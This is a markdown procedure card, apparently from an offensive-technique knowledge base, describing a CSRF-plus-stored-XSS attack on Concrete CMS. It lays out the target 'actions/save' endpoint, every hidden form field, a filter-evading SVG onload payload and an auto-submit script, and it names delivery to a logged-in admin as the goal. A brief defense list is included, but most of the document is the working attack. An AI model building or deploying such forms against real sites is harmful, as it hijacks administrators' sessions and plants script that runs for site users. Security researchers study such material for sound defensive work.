---
id: p-concrete-craft-form
tags:
  - csrf
  - xss
  - payload-craft
  - concrete-cms
type: procedure
tools: []
tactics:
  - '[[Initial Access]]'
commands: []
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[JavaScript]]'
updated_at: '2025-12-14T17:27:03.704Z'
skill_level: intermediate
impact_level: medium
detection_risk: low
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Initial Access]]'
mitre_techniques:
  - '[[JavaScript]]'
---
# Craft Malicious HTML Form for CSRF and XSS Injection

## Summary

This procedure creates a self-submitting HTML form that exploits the CSRF vulnerability in Concrete CMS by posting unsanitized XSS payloads to the community points actions save endpoint, leveraging an admin's active session.

## Description

The form mimics the legitimate save action but embeds a stored XSS payload in parameters like upaHandle (e.g., `<sVg/OnLOaD=prompt(1)>` to evade basic filters). When loaded by a logged-in admin, it auto-submits, creating a malicious action. This targets Concrete CMS versions without CSRF tokens. Prerequisites: Knowledge of the endpoint from prior recon. Expected outcome: A deliverable HTML file that injects the payload upon submission.

## Requirements

1. Text editor for HTML creation
2. Hosting for the HTML file (e.g., local server or web host)
3. Target Concrete CMS URL

## Defense

Defensive measures and detection strategies:

- Require CSRF tokens on all POST forms
- Sanitize and escape all user inputs before storage and output
- Scan for and block auto-submitting forms from external sources

## Objectives

1. Build a functional CSRF form with XSS payload
2. Ensure compatibility with the target endpoint
3. Prepare for delivery to the victim

## Instructions

### Step 1: Define Form Structure

**Context**: Set up the basic HTML form targeting the vulnerable endpoint.

Create an HTML file with `<form method="POST" action="http://target.com/concrete/index.php/dashboard/users/points/actions/save">` and include a submit button or auto-submit script.

### Step 2: Add Malicious Parameters

**Context**: Embed required and payload parameters as hidden inputs.

Add inputs: `<input type="hidden" name="upaID" value="">`, `<input type="hidden" name="upaIsActive" value="1">`, `<input type="hidden" name="upaHandle" value="<sVg/OnLOaD=prompt(1)>">`, `<input type="hidden" name="upaName" value="XSS the admin">`, `<input type="hidden" name="upaDefaultPoints" value="1000">`, `<input type="hidden" name="gBadgeID" value="">`.

### Step 3: Enable Auto-Submission

**Context**: Make the form submit automatically when loaded.

Add `<script>document.forms[0].submit();</script>` at the end to trigger POST on load.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]] Initial Access

### Techniques

- [[JavaScript]] JavaScript (XSS payload crafting)

### Sub-Techniques


## Commands Used


## Tools Used


## Tags

- csrf
- xss
- payload
